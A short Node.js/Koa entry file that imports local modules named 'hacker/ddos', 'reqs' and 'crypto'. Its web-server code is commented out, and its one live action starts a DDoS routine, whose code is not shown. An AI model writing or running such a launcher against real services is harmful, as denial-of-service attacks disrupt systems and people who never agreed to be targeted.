const koa = require('koa');
const koaStatic = require('koa-static');
const fs = require('fs');
const path = require('path');
const Ddos = require('./modules/hacker/ddos');
const reqs = require('./modules/hacker/reqs');
//const crawler = require('./modules/hacker/crawler');
// const {SocketManager} = require('./modules/hacker/utils');
const crypto = require('./modules/hacker/crypto');
const app = new koa();


// app.use(koaStatic(__dirname+'/www/dist'));
// app.use(koaStatic('/Users/mac/Documents/HASHREAL/hashreal.front/h5'));
// app.use(koaStatic('/Users/mac/Documents/HASHREAL/hashreal.front/pc'));
// app.use(koaStatic('/Users/mac/Documents/eface-board/pc/dist'));
// app.use(koaStatic('/Users/mac/Documents/cloud-platform-eface.web/org/dist'));

// app.use(async (ctx) => {
// 	if(ctx.path=="/api/getServerInfo"){
// 		ctx.response.status = 200;
//   		ctx.body = 'node server';
// 	}
// });

// const port = 8089;
// app.listen(port,()=>{
// 	console.log("server ok,running at " + port);
// });

const ddos = new Ddos();
ddos.start();
// reqs();

























